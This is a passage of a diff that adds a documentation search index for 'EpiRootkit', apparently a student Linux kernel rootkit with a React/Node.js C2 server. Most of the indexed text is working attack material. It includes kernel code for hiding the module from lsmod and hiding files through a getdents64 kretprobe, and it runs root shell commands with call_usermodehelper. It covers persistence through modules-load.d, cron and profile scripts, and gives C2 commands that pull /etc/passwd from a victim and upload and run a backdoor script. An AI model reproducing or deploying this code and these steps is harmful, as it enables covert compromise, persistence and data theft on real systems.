initiated └─ # Verify upload c2-server$ exec Client-1 ls -la /tmp/backdoor.sh c2-server$ exec Client-1 chmod +x /tmp/backdoor.sh Download Files from Victim link # Download sensitive files c2-server$ download Client-1 /etc/passwd ./victim_passwd ┌─ File Download • Downloading /etc/passwd → ./victim_passwd ✓ Download request sent └─ Advanced Workflows linkPersistence Management linkInstall Persistence link # Interactive persistence menu c2-server$ persist Client-1 ┌─ Persistence Management - Client-1 • Install All Methods • Remove All Methods • Install Specific Method • Show Status • Exit ? Select persistence action: Install All Methods ┌─ Installing Persistence • Installing all persistence mechanisms on Client-1... ✓ all persistence mechanisms installation command sent └─ # Install specific method c2-server$ persist Client-1 install modules ┌─ Installing Persistence • Installing modules-load.d persistence on Client-1... ✓ modules-load.d persistence installation command sent └─ Stealth Configuration linkInteractive Configuration link c2-server$ config Client-1 ┌─ Configuration - Client-1 • Fetching current status... Current Configuration: [X] Module Hiding (Click to disable) [ ] Persistence (Click to enable) Refresh Status Exit ? Select option: [X] Module Hiding (Click to disable) ┌─ Configuration - Client-1 • Applying configuration change... ✓ Configuration updated └─ Manual Stealth Commands link # Hide module from lsmod c2-server$ exec Client-1 lsmod | grep epirootkit # (should show module) # Enable hiding c2-server$ status Client-1 # Check if \"Module Hidden: YES\" # Verify hiding c2-server$ exec Client-1 lsmod | grep epirootkit # (should show no output if hidden) "
+            }
+        );
+    index.add(
+            {
+                id:  12 ,
+                href: "\/docs\/04-web-ui\/",
+                title: "Web UI (C2 Frontend)",
+                description: "Modern React-based web interface for EpiRootkit C2 server management",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  13 ,
+                href: "\/docs\/04-web-ui\/overview\/",
+                title: "Overview",
+                description: "Modern web interface for EpiRootkit C2 server",
+                content: "Web UI Overview linkModern React-based web interface for EpiRootkit C2 server management.\nQuick Start link # Start C2 server with Web UI ./deploy_c2.sh # Access Web UI at http://localhost:3000 # Default password is secret123 Architecture linkTechnology stack and integration.\nFrontend: React 18 + Vite Backend: Express.js + Socket.IO Authentication: JWT with session management Real-time: WebSocket connections "
+            }
+        );
+    index.add(
+            {
+                id:  14 ,
+                href: "\/docs\/04-web-ui\/installation\/",
+                title: "Installation \u0026 Setup",
+                description: "How to install and launch the Web UI",
+                content: "Installation \u0026 Setup linkThe Web UI is integrated with the C2 server and launches automatically.\nPrerequisites linkSystem requirements for running the Web UI.\nNode.js: v18+ pnpm: v8+ (recommended) or npm OS: Ubuntu 20.04+ or similar Linux distribution Installation linkQuick setup process.\n# On the root of the project ./deploy_c2.sh "
+            }
+        );
+    index.add(
+            {
+                id:  15 ,
+                href: "\/docs\/04-web-ui\/features\/",
+                title: "Features",
+                description: "Web UI capabilities and components",
+                content: "Web UI Features linkModern React interface for EpiRootkit C2 server management.\nCore Features link "
+            }
+        );
+    index.add(
+            {
+                id:  16 ,
+                href: "\/docs\/04-web-ui\/features\/panels\/",
+                title: "UI Panels",
+                description: "Individual Web UI panel components",
+                content: "Web UI Panels linkIndividual panel components that make up the Web UI interface.\nAvailable Panels link "
+            }
+        );
+    index.add(
+            {
+                id:  17 ,
+                href: "\/docs\/04-web-ui\/features\/authentication\/",
+                title: "Authentication",
+                description: "Secure login with JWT tokens and session management",
+                content: "Authentication linkSecure login with JWT tokens and automatic session management.\nFeatures link JWT Authentication: Secure token-based login system Auto-logout: Automatic logout when session expires (1 hour) Client Authentication: Authenticate individual rootkit clients Persistent Sessions: Survives browser refresh "
+            }
+        );
+    index.add(
+            {
+                id:  18 ,
+                href: "\/docs\/04-web-ui\/features\/dashboard\/",
+                title: "Dashboard",
+                description: "Real-time client monitoring and statistics",
+                content: "Dashboard linkMain interface for monitoring connected rootkit clients with real-time statistics.\nFeatures link Live Statistics: Total, active, and authenticated client counts Grid/Table Views: Switch between visual cards and detailed table Real-time Search: Filter clients by ID, IP, or status Status Indicators: Color-coded connection states (Green/Yellow/Red) Quick Actions: One-click authentication and client management "
+            }
+        );
+    index.add(
+            {
+                id:  19 ,
+                href: "\/docs\/04-web-ui\/features\/client-management\/",
+                title: "Client Management",
+                description: "Monitor and interact with connected rootkit clients",
+                content: "Client Management linkMonitor and interact with connected rootkit clients in real-time.\nFeatures link Connection Status: Visual indicators (Green/Yellow/Red) for client state Client Authentication: Secure password-based client authentication Real-time Updates: Live connection and status changes via WebSocket Client Information: ID, IP address, last seen timestamps Health Monitoring: Automatic stale client detection and alerts "
+            }
+        );
+    index.add(
+            {
+                id:  20 ,
+                href: "\/docs\/04-web-ui\/features\/panels\/terminal-panel\/",
+                title: "Terminal Panel",
+                description: "Remote command execution interface with terminal emulation",
+                content: "Terminal Panel linkFull terminal emulator for remote command execution with history and real-time output.\nFeatures link Command History: Navigate with ↑/↓ arrow keys Real-time Output: Live command execution streaming Quick Commands: One-click shortcuts for common operations Status Indicators: Visual execution and connection status Clean Display: Parsed output without C2 metadata "
+            }
+        );
+    index.add(
+            {
+                id:  21 ,
+                href: "\/docs\/04-web-ui\/features\/panels\/persistence-panel\/",
+                title: "Persistence Panel",
+                description: "Boot persistence configuration and management",
+                content: "Persistence Panel linkConfigure rootkit boot survival with multiple persistence methods and one-click setup.\nFeatures link Module System Boot: systemd modules-load.d (recommended) Cron Scheduled Task: Periodic 5-minute checks Profile Login Trigger: Shell profile modification Quick Setup: One-click recommended installation Status Indicators: Visual active/inactive states "
+            }
+        );
+    index.add(
+            {
+                id:  22 ,
+                href: "\/docs\/04-web-ui\/features\/panels\/event-log-panel\/",
+                title: "Event Log Panel",
+                description: "Activity and event monitoring interface",
+                content: "Event Log Panel linkReal-time activity monitoring with filtering, search, and export capabilities.\nFeatures link Real-time Events: Connection, authentication, and command events Event Filtering: Filter by type, category, and time period Search Functionality: Text search with regex support Export Logs: Download events as JSON for analysis Color Coding: Visual event type identification "
+            }
+        );
+    index.add(
+            {
+                id:  23 ,
+                href: "\/docs\/04-web-ui\/features\/panels\/upload-download-panel\/",
+                title: "Upload/Download Panel",
+                description: "File transfer interface with drag-and-drop support",
+                content: "Upload/Download Panel linkFile transfer interface with drag-and-drop upload and remote file browser.\nFeatures link Drag-and-Drop Upload: Large drop zone for easy file uploads Remote File Browser: Navigate and download from target filesystem Progress Tracking: Real-time transfer progress bars Transfer History: Track all upload/download operations Error Handling: Clear error messages and retry options "
+            }
+        );
+    index.add(
+            {
+                id:  24 ,
+                href: "\/docs\/04-web-ui\/features\/panels\/overview-panel\/",
+                title: "Overview Panel",
+                description: "Client status and quick actions dashboard",
+                content: "Overview Panel linkClient status dashboard with connection monitoring and quick action buttons.\nFeatures link Connection Status: Real-time health and connection indicators Authentication Status: Session state and security level System Information: Client ID, IP address, and OS details Quick Actions: One-click authentication and management Visual Indicators: Color-coded status with progress animations "
+            }
+        );
+    index.add(
+            {
+                id:  25 ,
+                href: "\/docs\/04-web-ui\/features\/panels\/configuration-panel\/",
+                title: "Configuration Panel",
+                description: "Rootkit settings and configuration management",
+                content: "Configuration Panel linkManage rootkit stealth and security settings with toggle switches and real-time updates.\nFeatures link Module Hiding: Toggle rootkit visibility in system Persistence: Configure boot survival mechanisms Communication Encryption: Secure C2 communication Real-time Updates: Changes applied immediately Status Indicators: Visual feedback for all settings "
+            }
+        );
+    index.add(
+            {
+                id:  26 ,
+                href: "\/docs\/04-web-ui\/features\/panels\/authentication-panel\/",
+                title: "Authentication Panel",
+                description: "Client authentication management and security interface",
+                content: "Authentication Panel linkSecure client authentication with session management and security monitoring.\nFeatures link Secure Login: Password-based client authentication Session Management: Monitor and control authentication sessions Security Monitoring: Track authentication attempts and failures Access Control: Manage client permissions and access levels Visual Feedback: Real-time authentication status indicators "
+            }
+        );
+    index.add(
+            {
+                id:  27 ,
+                href: "\/docs\/05-epirootkit\/",
+                title: "EpiRootkit",
+                description: "Linux kernel rootkit implementation for kernel 5.4.0",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  28 ,
+                href: "\/docs\/05-epirootkit\/configuration-justifications\/",
+                title: "Configuration Justifications",
+                description: "Justification for Ubuntu 20.04 LTS / Linux 5.4.x",
+                content: " info This page explains why we chose Ubuntu 20.04 LTS with the 5.4.x kernel for our rootkit development and testing. Environment link OS: Ubuntu 20.04 LTS (Focal Fossa) Kernel: 5.4.x (LTS) Why Ubuntu 20.04 LTS? link check_circle Perfect balance between realism and convinience. Widely deployed on servers and desktops Official cloud and container images simplify automation Already uses interesting kernel version (5.4.x) so no need to compile. Why Kernel 5.4.x? link info Balances modern hooking APIs with exported symbols and no mandatory module signing. Full ftrace support\nKernel 4.1+ stabilized the ftrace API (ftrace_set_filter_ip(), register_ftrace_function()). 5.4.x includes every hook we need. Exported kallsyms_lookup_name()\nUp through 5.6 the symbol remains exported. Allows us to resolve sys_call_table at runtime–no kernel recompilation. Unsigned module loading\nKernels ≥ 5.7 often enforce module signatures or Secure Boot lockdown. Ubuntu 20.04’s 5.4.x ships without these restrictions by default. Already compiled in Ubuntu 20.04 LTS\nAs mentionned before Ubuntu 20.04 LTS comes already packing with kernel version 5.4.x making it very easy for us to use and deploy. Alternative Options link Kernel 5.6 Technically we could go until kernel version 5.6 but for practical reasons mentionned above, we went with 5.4.x. Wich in my opinion is still relevant because in LTS. Debian 11 (5.10.x) Still exports our symbols–requires disabling module signature checks. warning If we experiment on kernels ≥ 5.7, we need to append module.sig_enforce=0 to the boot parameters to allow unsigned modules. "
+            }
+        );
+    index.add(
+            {
+                id:  29 ,
+                href: "\/docs\/05-epirootkit\/overview\/",
+                title: "EpiRootkit Overview",
+                description: "Linux kernel rootkit for Ubuntu 20.04 / kernel 5.4.0",
+                content: "EpiRootkit linkLinux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).\nWhat We Built linkEpiRootkit is a kernel module that provides:\nC2 Communication: TCP connection to command \u0026 control server Remote Commands: Execute shell commands with output capture File Transfer: Upload/download files between C2 and victim Authentication: SHA-512 password verification with rate limiting Stealth: Hide module from lsmod and hide files from directory listings Persistence: Multiple mechanisms to survive reboots Proper Deployment: Two-stage architecture following Linux best practices Architecture linkDeployment Architecture link Deployment Script ←→ EpiRootkit (Kernel Module) ←→ Target System Stage 1: Loader Stage 2: Runtime Linux Kernel 5.4.0 Two-Stage Deployment:\nStage 1 (Loader): scripts/deploy_rootkit.sh handles proper module deployment Stage 2 (Runtime): Rootkit focuses on functionality, not self-deployment Communication Architecture link C2 Server (Node.js) ←→ EpiRootkit (Kernel Module) ←→ Target System Port 4444 Network + Commands Linux Kernel 5.4.0 Quick Demo link # 1. Build and load rootkit cd rootkit \u0026\u0026 make \u0026\u0026 sudo insmod epirootkit.ko # 2. Start C2 server cd attacking_program \u0026\u0026 pnpm start # 3. Use the rootkit c2-server$ auth Client-1 password c2-server$ exec Client-1 whoami c2-server$ status Client-1 Core Components linkNetwork Layer link Connection Management: Persistent TCP connection with auto-reconnect Keepalive System: 60-second ping/pong to detect disconnections Socket Handling: Low-level network operations Command System link Authentication: auth - SHA-512 password verification Execution: exec - Run shell commands with output capture File Operations: upload/download - Transfer files Status: status - Get rootkit information Persistence: persist_* - Install/remove boot persistence Stealth: hide_module/unhide_module - Toggle visibility Stealth Features link Module Hiding: Remove from kernel module list (lsmod) File Hiding: Hide files with specific prefixes from directory listings Syscall Hooking: Uses kretprobe on getdents64 Persistence Mechanisms link modules-load.d: Systemd automatic module loading Cron Jobs: Scheduled module loading Shell Profiles: Load via user login scripts Technical Details link Target: Ubuntu 20.04 LTS with kernel 5.4.0 Language: C (kernel module) + Node.js (C2 server) APIs Used: ftrace, kretprobe, VFS, crypto API Network: TCP on port 4444 (configurable) Authentication: SHA-512 with rate limiting (5 attempts/60s) Configuration linkKey settings in rootkit/core/config.h:\n#define C2_SERVER_IP \"192.168.64.1\" #define C2_SERVER_PORT 4444 #define ENABLE_ENCRYPTION 0 // Currently disabled #define ENABLE_PERSISTENCE 1 // Auto-install persistence #define ENABLE_FILE_HIDING 1 // Hide files with prefixes Documentation Structure link "
+            }
+        );
+    index.add(
+            {
+                id:  30 ,
+                href: "\/docs\/05-epirootkit\/deployment\/",
+                title: "Build \u0026 Deployment",
+                description: "How to build and load EpiRootkit on Ubuntu 20.04",
+                content: "Build \u0026 Deployment linkHow to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.\nDeployment Architecture linkEpiRootkit follows a two-stage deployment approach:\nStage 1 (Loader): scripts/deploy_rootkit.sh handles proper module deployment Stage 2 (Runtime): Rootkit focuses on functionality, not self-deployment This separation follows Linux kernel module best practices and eliminates unusual self-copying behavior.\nRequirements linkSystem link OS: Ubuntu 20.04 LTS Kernel: 5.4.0-* (check with uname -r) Architecture: x86_64 Dependencies link sudo apt update sudo apt install -y build-essential linux-headers-$(uname -r) Build Process link1. Navigate to Rootkit Directory link cd rootkit 2. Build the Module link make clean \u0026\u0026 make Expected output:\nmake -C /lib/modules/5.4.0-74-generic/build M=/path/to/rootkit modules CC [M] /path/to/rootkit/core/main.o CC [M] /path/to/rootkit/commands/commands.o CC [M] /path/to/rootkit/commands/auth_commands.o CC [M] /path/to/rootkit/commands/exec_commands.o CC [M] /path/to/rootkit/commands/file_commands.o CC [M] /path/to/rootkit/commands/status_commands.o CC [M] /path/to/rootkit/commands/stealth_commands.o CC [M] /path/to/rootkit/network/connection.o CC [M] /path/to/rootkit/network/socket.o CC [M] /path/to/rootkit/network/keepalive.o CC [M] /path/to/rootkit/stealth/stealth.o CC [M] /path/to/rootkit/persistence/persistence.o CC [M] /path/to/rootkit/security/auth.o CC [M] /path/to/rootkit/security/crypto.o CC [M] /path/to/rootkit/utils/sysfs.o LD [M] /path/to/rootkit/epirootkit.ko 3. Verify Build link ls -la epirootkit.ko file epirootkit.ko Should show: ELF 64-bit LSB relocatable, x86-64\nConfiguration linkNetwork Settings linkEdit rootkit/core/config.h before building:\n#define C2_SERVER_IP \"192.168.64.1\" // Your C2 server IP #define C2_SERVER_PORT 4444 // C2 server port Feature Settings link #define ENABLE_ENCRYPTION 0 // Encryption disabled #define ENABLE_PERSISTENCE 1 // Auto-install persistence #define ENABLE_FILE_HIDING 1 // Hide files with prefixes Deployment Methods linkMethod 1: Deployment Script (Recommended) linkUses the proper loader stage for deployment:\n# Deploy using the deployment script sudo ./scripts/deploy_rootkit.sh # Or specify custom module path sudo ./scripts/deploy_rootkit.sh /path/to/epirootkit.ko What the deployment script does:\nValidates module and root privileges Deploys module to /lib/modules/$(uname -r)/extra/ Sets up autoload via /etc/modules-load.d/epirootkit.conf Updates dependencies with depmod -a Loads module immediately Verifies deployment Method 2: Manual Loading (Basic) linkFor development and testing:\nsudo insmod epirootkit.ko Verify Loading link # Check if loaded (may be hidden if stealth enabled) lsmod | grep epirootkit # Alternative check if module is hidden ls -la /sys/module/epirootkit # Check kernel messages dmesg | tail -10 Expected kernel messages:\n[ 123.456] EpiRootkit: Starting initialization (v1.0.0) [ 123.457] EpiRootkit: Connection module initialized [ 123.458] EpiRootkit: Stealth module initialized [ 123.459] EpiRootkit: Persistence module initialized [ 123.460] EpiRootkit: All subsystems initialized successfully [ 123.461] EpiRootkit: Attempting connection to 192.168.64.1:4444 Deployment Management linkCheck Status link sudo ./scripts/deploy_rootkit.sh status Complete Removal link sudo ./scripts/deploy_rootkit.sh uninstall Automatic Features linkWhen the module loads, it automatically:\nConnects to C2 server (if running) Installs runtime persistence (cron, shell profiles) Enables file hiding (hides files with specific prefixes) Starts keepalive system (60-second ping/pong) Note: Module deployment persistence is handled by the deployment script, not the runtime module.\nModule Management linkUnload Module link sudo rmmod epirootkit # Or use Makefile target sudo make remove Manual Persistence Cleanup link # Remove runtime persistence mechanisms only sudo rm -f /etc/cron.d/system-update sudo rm -f /etc/profile.d/system-env.sh # Module deployment persistence (handled by deployment script) sudo rm -f /etc/modules-load.d/epirootkit.conf sudo rm -f /lib/modules/$(uname -r)/extra/epirootkit.ko Clean Build link make clean File Locations linkDeployment Files (by deploy script) link Module: /lib/modules/$(uname -r)/extra/epirootkit.ko Autoload: /etc/modules-load.d/epirootkit.conf Runtime Files (by rootkit) link Cron: /etc/cron.d/system-update Profile: /etc/profile.d/system-env.sh Next Steps link "
+            }
+        );
+    index.add(
+            {
+                id:  31 ,
+                href: "\/docs\/05-epirootkit\/connection-authentication\/",
+                title: "Connection \u0026 Authentication",
+                description: "How the rootkit connects to C2 server and authenticates",
+                content: "Connection \u0026 Authentication linkHow EpiRootkit connects to the C2 server and handles authentication.\nConnection Process linkAutomatic Connection linkWhen the rootkit loads, it automatically:\nStarts connection thread (epirootkit_conn) Attempts TCP connection to configured C2 server Begins keepalive system (60-second ping/pong) Handles reconnection with exponential backoff Configuration link // rootkit/core/config.h #define C2_SERVER_IP \"192.168.64.1\" #define C2_SERVER_PORT 4444 #define KEEPALIVE_INTERVAL_MS 60000 #define RECONNECT_DELAY_MS 5000 Network Architecture linkThree-Layer System link Connection Management (connection.c) - High-level coordination Keepalive System (keepalive.c) - Health monitoring Socket Management (socket.c) - Low-level network operations Connection States link 0 = DISCONNECTED 1 = CONNECTED 2 = CONNECTING Authentication System linkHow It Works link C2 sends command: auth Client-1 password Rootkit receives: Plain text password Rootkit hashes: Using SHA-512 kernel crypto API Compares hash: Against stored hash in config Returns result: SUCCESS or ERROR Implementation link // Default password is \"password\" (SHA-512 hash stored in config) #define PASSWORD_HASH \"b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86\" Security Features link Rate limiting: 5 attempts per 60 seconds Session timeout: 1 hour automatic expiry Secure hashing: SHA-512 using kernel crypto API Live Demo link1. Start C2 Server link cd attacking_program \u0026\u0026 pnpm start 2. Load Rootkit link sudo insmod epirootkit.ko C2 server shows:\n[2025-05-25 16:13:09] New client connected: Client-1 [2025-05-25 16:13:09] Client-1 status: UNAUTHENTICATED 3. Check Connection link c2-server$ clients # • Client-1 - UNAUTHENTICATED - Last seen: 6:13:09 PM 4. Authenticate link c2-server$ auth Client-1 password # ✓ [2025-05-25 16:13:29] Authenticated # SUCCESS: Authentication successful 5. Verify Authentication link c2-server$ clients # • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM Keepalive System linkPurpose link Detect disconnections: Network failures, system crashes Maintain connection: Regular ping/pong messages Trigger reconnection: When connection lost How It Works link Ping interval: Every 60 seconds Timeout detection: 30 seconds for response Failure threshold: 3 consecutive failed pings Automatic reconnection: Exponential backoff (5s → 10s → 20s → 40s → 60s max) Monitoring link # Check keepalive status from C2 c2-server$ keepalive Client-1 # Keepalive Status: # Last ping sent: 2025-05-25 16:14:00 # Last pong received: 2025-05-25 16:14:00 # Failed ping count: 0 # Connection stable: YES Reconnection Handling linkDisconnection Detection link Socket-level: Immediate network failures Keepalive timeout: No response to ping Send failures: Failed command results Reconnection Process link Detect disconnection Wait with backoff: 5s → 10s → 20s → 30s (max) Attempt reconnection Reset authentication: Must re-authenticate after reconnect Resume operations "
+            }
+        );
+    index.add(
+            {
+                id:  32 ,
+                href: "\/docs\/05-epirootkit\/features\/",
+                title: "Features",
+                description: "EpiRootkit core functionality and capabilities",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  33 ,
+                href: "\/docs\/05-epirootkit\/features\/command-execution\/",
+                title: "Command Execution",
+                description: "Execute shell commands remotely with full output capture",
+                content: "Command Execution linkExecute shell commands remotely through the rootkit with full output capture.\nHow It Works link C2 sends command: exec Client-1 whoami Rootkit receives: Command string via network Executes command: Using call_usermodehelper() with /bin/sh -c Captures output: Redirects stdout/stderr to temporary file Returns result: Exit code and output back to C2 Implementation Details linkExecution Method link API: call_usermodehelper() (kernel 5.4.0 compatible) Shell: /bin/sh -c \"command\" Privileges: Runs with root privileges Output capture: Temporary files in /tmp/epirootkit_out_* Limits link Command length: 1024 bytes (MAX_COMMAND_LENGTH) Output size: 64KB (MAX_OUTPUT_SIZE) with dynamic allocation Timeout: No timeout (commands run to completion) Usage Examples link # System information c2-server$ exec Client-1 whoami # Exit code: 0 # Output: # root c2-server$ exec Client-1 uname -a # Exit code: 0 # Output: # Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux Technical Implementation linkCommand Processing link // Simplified version of the actual implementation static int handle_exec(const char *data) { char *argv[] = { \"/bin/sh\", \"-c\", command_copy, NULL }; char *envp[] = { \"HOME=/\", \"PATH=/sbin:/bin:/usr/bin:/usr/local/bin\", \"TERM=xterm\", NULL }; // Generate unique temporary filename snprintf(temp_filename, sizeof(temp_filename), \"/tmp/epirootkit_out_%d\", atomic_inc_return(\u0026exec_counter)); // Build command with output redirection snprintf(full_command, command_len + temp_len + 32, \"%s \u003e %s 2\u003e\u00261\", data, temp_filename); // Execute command ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC); // Read output from temporary file // ... (file reading logic) return send_result(formatted_result); } Output Capture link Redirection: command \u003e /tmp/epirootkit_out_X 2\u003e\u00261 File reading: kernel_read() to get output Dynamic allocation: vmalloc() for large outputs Cleanup: Automatic temporary file removal Security Considerations linkPrivileges link Root execution: All commands run with kernel-level privileges No sandboxing: Commands have full system access Logging: All commands logged to kernel log via pr_info() Limitations link No interactive commands: Cannot handle commands requiring user input "
+            }
+        );
+    index.add(
+            {
+                id:  34 ,
+                href: "\/docs\/05-epirootkit\/features\/file-transfer\/",
+                title: "File Transfer",
+                description: "Upload and download files between C2 server and victim system",
+                content: "File Transfer linkTransfer files between the C2 server and victim system using direct content transmission.\nHow It Works linkUpload Process link C2 reads local file and sends content Rootkit receives filename and content Creates file on victim system using filp_open() Writes content using kernel_write() Download Process link C2 requests file by path Rootkit opens file using filp_open() Reads content using kernel_read() Sends content back to C2 server Upload Feature linkBasic Usage link # Upload file to specific path c2-server$ upload Client-1 ./config.txt /etc/myapp/config.txt # ✓ File uploaded successfully (1024 bytes) # Upload to current directory (uses basename) c2-server$ upload Client-1 ./script.sh # ✓ File uploaded successfully (512 bytes) -\u003e ./script.sh Implementation Details link File creation: Uses O_WRONLY | O_CREAT | O_TRUNC flags Permissions: Files created with 0644 permissions Size limits: 10MB maximum file size Download Feature linkBasic Usage link # Download to specific local path c2-server$ download Client-1 /etc/passwd ./victim_passwd # ✓ File downloaded successfully (2048 bytes) # Download to current directory (uses basename) c2-server$ download Client-1 /etc/hostname # ✓ File downloaded successfully (64 bytes) -\u003e ./hostname Real Examples linkSystem Files link # Download system configuration c2-server$ download Client-1 /etc/passwd # ✓ File downloaded successfully (2048 bytes) # Content: root:x:0:0:root:/root:/bin/bash # daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin # ... # Download network configuration c2-server$ download Client-1 /etc/hosts # ✓ File downloaded successfully (256 bytes) # Content: 127.0.0.1\tlocalhost # 127.0.1.1\tvictim # ... Upload Scripts link # Upload a shell script c2-server$ upload Client-1 ./backdoor.sh /tmp/backdoor.sh # ✓ File uploaded successfully (1024 bytes) # Make it executable (via exec command) c2-server$ exec Client-1 chmod +x /tmp/backdoor.sh # Exit code: 0 # Run the script c2-server$ exec Client-1 /tmp/backdoor.sh # Exit code: 0 # Output: Backdoor installed successfully Technical Implementation linkUpload Handler link static int handle_upload(const char *data) { char *filename, *file_content, *separator; struct file *file; loff_t pos = 0; ssize_t bytes_written; // Parse filename:content format separator = strchr(data, ':'); *separator = '\\0'; filename = data; file_content = separator + 1; // Validate filename if (!validate_filename(filename)) return send_error(\"Invalid or unsafe filename\"); // Create and write file file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644); bytes_written = kernel_write(file, file_content, content_length, \u0026pos); filp_close(file, NULL); return send_success(\"File uploaded successfully\"); } Download Handler link static int handle_download(const char *data) { struct file *file; loff_t file_size, pos = 0; char *file_content, *result_buffer; ssize_t bytes_read; // Open file file = filp_open(data, O_RDONLY, 0); if (IS_ERR(file)) return send_error(\"File not found or cannot be opened\"); // Check file size file_size = i_size_read(file_inode(file)); if (file_size \u003e MAX_FILE_SIZE) { filp_close(file, NULL); return send_error(\"File too large to download\"); } // Read file content file_content = vmalloc(file_size + 1); bytes_read = kernel_read(file, file_content, file_size, \u0026pos); file_content[bytes_read] = '\\0'; // Format response result_buffer = vmalloc(file_size + 32); snprintf(result_buffer, file_size + 32, \"DOWNLOAD:%s\", file_content); return send_result(result_buffer); } Configuration link // rootkit/core/config.h #define MAX_FILE_SIZE (10 * 1024 * 1024) // 10MB #define MAX_FILENAME_LENGTH 255 "
+            }
+        );
+    index.add(
+            {
+                id:  35 ,
+                href: "\/docs\/05-epirootkit\/features\/hiding\/",
+                title: "Stealth \u0026 Hiding",
+                description: "Module hiding and file hiding capabilities",
+                content: "Stealth \u0026 Hiding linkHide the rootkit module and files from system detection using kernel hooking techniques.\nWhat We Implemented linkModule Hiding link Hide from lsmod: Remove module from kernel module list Hide from /proc/modules: Module not visible in procfs Dynamic control: Toggle visibility via C2 commands File Hiding link Hide by prefix: Files with specific prefixes are hidden Directory listing: Intercept getdents64 syscall Automatic hiding: Enabled by default when module loads Module Hiding linkHow It Works link Find module: Locate rootkit in kernel module list Remove from list: Use list_del() to remove from modules list Store reference: Keep pointer to restore later Toggle visibility: Can hide/unhide dynamically Implementation link int hide_module(void) { struct module *mod; mutex_lock(\u0026module_mutex); list_for_each_entry(mod, \u0026modules, list) { if (mod == THIS_MODULE) { stealth_state.prev_module_entry = mod-\u003elist.prev; list_del(\u0026mod-\u003elist); stealth_state.module_hidden = true; break; } } mutex_unlock(\u0026module_mutex); return 0; } Usage link # Hide the module c2-server$ config Client-1 # Select: Toggle Module Hiding # ✓ Module hidden # Verify hiding (from victim system) victim$ lsmod | grep epirootkit # (no output - module is hidden) # Check status c2-server$ status Client-1 # Module Hidden: YES Detection Evasion link lsmod command: Module not listed /proc/modules: Entry removed from procfs System monitoring: Most tools rely on these sources File Hiding linkHow It Works link Hook getdents64: Use kretprobe to intercept directory listings Filter entries: Remove files with configured prefixes Modify buffer: Adjust directory entry buffer Return filtered: Send modified listing to userspace Hidden File Prefixes linkFiles starting with these prefixes are automatically hidden:\nstatic const char * const hide_prefixes[] = { \"epirootkit\", \"jules_est_bo_\", \"memfd:\", \".hidden_\", }; Implementation link static int getdents64_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs) { struct getdents_context *ctx = (struct getdents_context *)ri-\u003edata; const long ret_value = regs_return_value(regs); char *kernel_buffer; long filtered_size; // Copy user buffer to kernel space for filtering kernel_buffer = kmalloc(ret_value, GFP_ATOMIC); if (copy_from_user(kernel_buffer, ctx-\u003euser_buffer, ret_value) == 0) { filtered_size = filter_directory_entries(kernel_buffer, ret_value); if (filtered_size != ret_value) { copy_to_user(ctx-\u003euser_buffer, kernel_buffer, filtered_size); regs_set_return_value(regs, filtered_size); } } kfree(kernel_buffer); return 0; } Examples of Hidden Files link # These files are hidden from 'ls' output: /tmp/epirootkit_temp /var/log/epirootkit.log /home/user/epirootkit_config /tmp/jules_est_bo_secret /tmp/.hidden_file /tmp/memfd:something Testing File Hiding link # Create test files c2-server$ exec Client-1 touch /tmp/epirootkit_test c2-server$ exec Client-1 touch /tmp/normal_file # List directory (file hiding active) c2-server$ exec Client-1 ls -la /tmp/ # Only shows: normal_file (epirootkit_test is hidden) # Files still exist and accessible c2-server$ exec Client-1 cat /tmp/epirootkit_test # Works fine - file exists but hidden from listings Dynamic Control linkInteractive Configuration link c2-server$ config Client-1 # ┌─ Configuration - Client-1 # Current Configuration: # [X] Module Hiding (Click to disable) # # ? Select option: [Use arrow keys] # ❯ [X] Module Hiding (Click to disable) # Refresh Status # Exit Technical Details linkSyscall Hooking link Method: kretprobe on getdents64 syscall Kernel version: Compatible with Linux 5.4.0 Memory safety: GFP_ATOMIC allocations with 4KB limit Error handling: Graceful fallback on allocation failures Module List Manipulation link Mutex protection: Uses module_mutex for thread safety List operations: Standard kernel list_del() and list_add() State tracking: Maintains hiding state in global structure Customize Hidden Prefixes linkEdit the hide_prefixes array in stealth.c to change which files are hidden.\n"
+            }
+        );
+    index.add(
+            {
+                id:  36 ,
+                href: "\/docs\/05-epirootkit\/features\/persistence\/",
+                title: "Persistence",
+                description: "Multiple boot persistence mechanisms for rootkit survival",
+                content: "Persistence linkMultiple boot persistence mechanisms to ensure rootkit survival across system reboots.\nWhat We Implemented linkThree Persistence Mechanisms link modules-load.d: Systemd automatic module loading Cron Jobs: Scheduled module loading via cron Shell Profiles: Load via user login scripts Automatic Installation link On module load: All persistence mechanisms installed automatically Dynamic control: Install/remove via C2 commands Individual control: Manage each mechanism separately How It Works linkAutomatic Installation linkWhen the rootkit loads, it automatically installs all persistence mechanisms:\nint persistence_init(void) { pr_info(\"EpiRootkit: Persistence module initialized\\n\"); // Automatically install all persistence mechanisms return persistence_install(); } Manual Control link # Install all persistence mechanisms c2-server$ persist_install Client-1 # SUCCESS: All persistence mechanisms installed # Remove all persistence mechanisms c2-server$ persist_remove Client-1 # SUCCESS: All persistence mechanisms removed # Individual mechanism control c2-server$ persist_modules Client-1 # modules-load.d only c2-server$ persist_cron Client-1 # cron only c2-server$ persist_profile Client-1 # shell profile only Mechanism 1: modules-load.d linkHow It Works link File: /etc/modules-load.d/epirootkit.conf Content: epirootkit Boot process: systemd reads config and loads module automatically Implementation link int persistence_install_modules_load(void) { char config_path[256]; int ret; snprintf(config_path, sizeof(config_path), \"%s%s\", MODULES_LOAD_DIR, EPIROOTKIT_CONF); ret = write_file(config_path, MODULE_NAME \"\\n\"); if (ret \u003c 0) return ret; pr_info(\"EpiRootkit: modules-load.d persistence installed\\n\"); return 0; } Verification link # Check if installed c2-server$ exec Client-1 cat /etc/modules-load.d/epirootkit.conf # Exit code: 0 # Output: # epirootkit # Remove manually c2-server$ exec Client-1 rm 